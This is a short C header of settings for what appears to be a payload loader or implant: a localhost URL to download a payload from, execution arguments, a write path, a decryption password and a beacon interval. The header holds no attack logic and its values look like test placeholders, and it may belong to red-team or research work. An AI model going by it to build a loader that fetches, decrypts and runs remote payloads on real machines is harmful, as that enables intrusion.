#ifndef PREFERENCES_H
#define PREFERENCES_H

//---------------------------------------------------------------
// EDIT PAYLOAD SETTINGS HERE

#define PAYLOAD_URL "https://127.0.0.1:25566/api/testloader?send=payload-5" // URL to download the payload from
#define PAYLOAD_ARGV {"example_argv1", "example_argv2", NULL} // arguments for the payload execution
#define PAYLOAD_ENVP {NULL} // environment variables for the payload execution
#define PATH_TO_WRITE "../test_files/test2.txt" // path to write payload to on host disk (if not executable)
#define ENC_PASSWORD "example_password" // symmetric password for decryption
#define BEACON_MODE 1 // 0 for instantly beacon once, any positive number x for beacon every x seconds
#define MAX_TIMEOUT 5 // max timeout for curl operations

//----------------------------------------------------------------

#endif